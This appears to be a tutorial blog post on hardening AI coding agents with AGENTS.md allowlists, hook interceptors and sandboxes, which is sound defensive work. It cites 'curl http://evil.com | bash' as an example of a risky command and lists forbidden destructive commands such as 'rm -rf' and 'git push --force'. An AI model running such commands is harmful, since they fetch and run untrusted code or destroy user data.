---
title: "Day 3 | Harness Hard Constraints: Static Contracts and Lifecycle Hooks"
slug: "ai-path-l3-day3-hard-constraints"
date: 2026-10-09T10:00:00+08:00
publishDate: 2026-10-09T10:00:00+08:00
draft: false
description: "AI Path L3 backbone article: why 'allow everything' is wrong, how static contracts constrain tool permissions, and how lifecycle hooks implement approval interception."
tags: ["AI", "tutorial", "Harness", "Agent Loop", "Hook", "Static Contract", "Hard Constraints"]
categories: ["ai-path"]
toc: true
series: ["AI Path Advanced Upgrade Guide"]
cover:
  image: cover.png
  alt: 'Watercolor style: A contract document locked with chains, beside three checkpoint gates labeled "read files", "modify code", "execute commands"'
---

> Previous article: [Day 2 | Minimalism and Hard Isolation: The Pi Paradigm](/en/posts/2026/09/ai-path-l3-day2-pi-minimalism/). After understanding why Pi cuts features, we now address a more specific question: after the cuts, how should the remaining capabilities be managed?

This is the backbone article of L3. Navigation for subsequent articles:

| Day | Type | Topic |
|-----|------|-------|
| Day 4 | Practice | Rewrite your AGENTS.md + add an interception Hook |
| Day 5 | Backbone | Tools as Interfaces: Three Extension Paths |
| Day 6 | Practice | Add a new tool to your Agent |
| Day 7 | Backbone | Meta-Architecture: Everything is a Plugin |
| Day 8 | Backbone | Memory, Traces, and Observability |
| Day 9 | Practice | Graduation project: Build a team-level CI/CD automation Harness |
| Day 10 | Phase summary | L3 graduation assessment + Harness future trends |

---

## The Problem with "Allow Everything"

Day 1's miniharness had 7 tools; Day 2's Pi cut it down to 4. Regardless of the count, they share a common premise: **all tools are available by default**.

You ask an Agent to write code, and it "needs" bash permissions to run tests and modify files. Give it bash, and you've given it the ability to run `rm -rf /tmp/build`, `git push --force`, `curl http://evil.com | bash`. You trust it, but every time it calls a tool, it asks the model: is this step safe? The model says "yes," you click allow, and it executes.

This is the "performative security" criticized in Day 2—permission popups aren't security; they just make you *feel* secure.

The real security model has two layers: **static constraints** lock permissions at harness startup; **dynamic interception** routes every call through a Hook for review. Together, these form the Harness's hard constraints.

## Static Contracts: The AGENTS.md Format Convention

Let's look at the first layer: static constraints.

The core question of static constraints is: **how do you make the model aware of its capabilities and limitations from the start?**

The answer is a file called `AGENTS.md`. This file sits in the project root and tells the Agent the project structure, coding standards, which tools can be used, and how to report completion.

AGENTS.md acts as a static contract definition. While injected into the model's context like a prompt, its power comes from the harness runtime, which validates model outputs against these rules and aborts execution upon violation.

```markdown
# AGENTS.md

## Project Structure
src/          # Source code
tests/        # Tests
docs/         # Documentation

## Allowed Bash Commands
- python3 -m pytest tests/
- python3 -m ruff check src/
- git status
- git diff

## Forbidden Commands
- rm -rf
- curl | bash
- git push --force
- pip install --upgrade  # No dependency upgrades

## Tool Permissions
- read: read-only, unrestricted
- write: can write to src/ and tests/, cannot overwrite AGENTS.md
- edit: same file path restrictions as write (cannot modify AGENTS.md or system files)
- bash: restricted to allowlist only
```

The value of this contract lies not in the file itself, but in the fact that it is deterministically enforced by the harness runtime before execution.

When the harness starts, it first validates the AGENTS.md format and content. If the model attempts to call a command not in the allowlist, the harness rejects it outright and returns an error message. This isn't a popup asking you to click "allow"—it's a hard interception at the code level.

![Static contracts: Three checkpoint gates blocking out-of-bounds operations](illustration-1.png)

## Lifecycle Hooks: The Interceptor Pattern

Static constraints govern "can it be used"; Hooks govern "should it pass another gate before use."

Hooks are a common concept in development frameworks: insert your own logic before or after an event occurs. In a harness, the common event points are before tool call, after tool call, and loop start/end.

The minimal implementation looks like this:

```python
class Hook:
    def on_before_tool(self, name, args):
        """Intercept before tool call"""
        pass

    def on_after_tool(self, name, result, is_error):
        """Intercept after tool call"""
        pass

    def on_loop_start(self, context):
        """At the start of each loop iteration"""
        pass

    def on_loop_end(self, context, status):
        """At the end of each loop iteration"""
        pass
```

Hooks can do many things:

- **Permission checks**: In `on_before_tool`, check the AGENTS.md allowlist; if the command isn't in the list, raise an exception
- **Parameter rewriting**: Change the model's `rm -rf /tmp/build` to a safer alternative command
- **Result validation**: In `on_after_tool`, check if the output meets expectations; if not, trigger a retry
- **Trace logging**: Write every tool call's input and output to a log file for post-hoc review
- **Context pruning**: When context exceeds a certain length, trigger summarization and compression

![Hook interceptor: Every tool call passes through three gates](illustration-2.png)

The industry standard is unified external interception. Major frameworks (Claude Code, Pi, OpenCode, smolagents) treat hooks as standalone components communicating with the harness through standardized interfaces, independent of specific tool implementations. Claude Code's hooks are standalone Shell scripts that receive JSON events via stdin/stdout[5]; Pi uses the `pi.on("tool_call", ...)` event system[2]; OpenCode's plugins register before/after callbacks at the loop level[6].

## A Complete Example: Git Protection Hook

This Hook's purpose: **prevent the Agent from performing destructive operations on Git repositories**.

```python
class GitProtectionHook(Hook):
    """Interceptor to prevent dangerous Git operations"""

    DANGEROUS_COMMANDS = [
        "git push --force",
        "git push -f",
        "git reset --hard",
        "git clean -fd",
        "git rm --cached -r .",
    ]

    def on_before_tool(self, name, args):
        if name != "bash":
            return

        command = args.get("command", "")

        for pattern in self.DANGEROUS_COMMANDS:
            if pattern in command:
                raise PermissionError(
                    f"Blocked dangerous command: {command[:80]}"
                )

        # Additional check: push to remote requires explicit authorization
        if "git push" in command and "--dry-run" not in command:
            raise PermissionError(
                "git push requires --dry-run flag for safety"
            )
```

This code is simple, but it solves a real high-risk problem in production scenarios.

Someone might ask: why not just have the model promise in the prompt "I won't do dangerous operations"? The answer is that models make mistakes, and they often make them under the motivation of "helping the user solve a problem"—it thinks you're helping it remove obstacles, so it becomes more aggressive in trying. Hard interception is more reliable than soft promises.

The value of this Hook also lies in **auditability**. Every interception is recorded; you can review what the Agent attempted, how many times it was blocked, and why. These logs are precious data for debugging Agent behavior.

![Audit log: Every interception is recorded](illustration-3.png)

## Three Layers of Defense: From Contract to Interception

Combining static constraints and Hooks gives us three layers of defense:

| Layer | Mechanism | Purpose | Cost |
|-------|-----------|---------|------|
| Layer 1 | AGENTS.md allowlist | Lock permissions at startup; Agent cannot request more on the fly | Lowest—parse file once |
| Layer 2 | Hook interceptors | Check before each call, rewrite params, log activity | Slight—function call overhead per call |
| Layer 3 | External sandbox | Containerized physical isolation; even if the first two layers break, the Agent cannot escape | Highest—requires additional resources |

Add layers as needed. Personal development might only need Layer 1; team collaboration needs all three; scenarios handling sensitive data must have all three active.

## Today's Practice Task

You've probably used Claude Code, Pi, Codex, or DeepSeek Harness before, right? Great—this exercise isn't about building a harness from scratch. It's about **observing how the tools you already use implement these constraints**.

Specific steps:
1. Pick one Agent tool you've used (Claude Code, Pi, Codex, or DeepSeek Harness)
2. Read its Hook configuration docs to understand what event types it supports
3. Write a simple Hook: intercept all bash commands, log to a file
4. Run a task and check what's recorded in the log
5. Also inspect AGENTS.md or equivalent config to see how static constraints are defined

The goal isn't to write code—it's to **develop an observational habit**: next time you use an Agent tool, notice what's happening behind the scenes, what's a hard constraint, and what's just a popup negotiation.

## Today's Takeaways

Today we discussed three core conclusions:

1. **Static constraints > dynamic negotiation**: Tool permissions should be locked at harness startup, not negotiated with popups on every call.
2. **Hooks are an interceptor pattern, not a permission system**: Hooks handle checking, rewriting, and logging—they don't judge "is this command safe?" That's AGENTS.md's job.
3. **Three layers of defense added as needed**: Whitelist + Hooks + Sandbox, each solving problems at different levels; don't try to solve everything with one layer.

Next up, Day 4, we'll rewrite AGENTS.md and actually add an interception Hook, turning today's theory into code.

---

## References

1. [tljcpa/miniharness: Minimal Harness empirical research repository](https://github.com/tljcpa/miniharness)
2. [Pi official documentation: extensions.md](https://github.com/earendil-works/pi/blob/main/packages/coding-agent/docs/extensions.md)
3. [DeepSeek Harness official documentation: architecture.md](https://github.com/deepseek-ai/deepseek-harness/blob/master/docs/architecture.md)
4. [Anthropic: Effective harnesses for long-running agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents)
5. [Claude Code: Hooks reference](https://code.claude.com/docs/en/hooks)
6. [OpenCode Hook system documentation](https://github.com/anomalyco/opencode/blob/main/docs/hooks.md)
